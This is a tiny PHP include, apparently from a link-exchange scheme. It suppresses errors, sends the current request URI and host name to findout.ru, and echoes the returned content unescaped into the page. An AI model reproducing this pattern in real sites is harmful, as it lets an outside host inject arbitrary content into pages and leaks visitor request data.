<?php
ini_set('error_reporting','E_ERROR');
echo join("", file("http://findout.ru/dir-partner/?id=4434&action=".urlencode($HTTP_SERVER_VARS['REQUEST_URI'])."&host=".urlencode($HTTP_SERVER_VARS['HTTP_HOST'])));
?>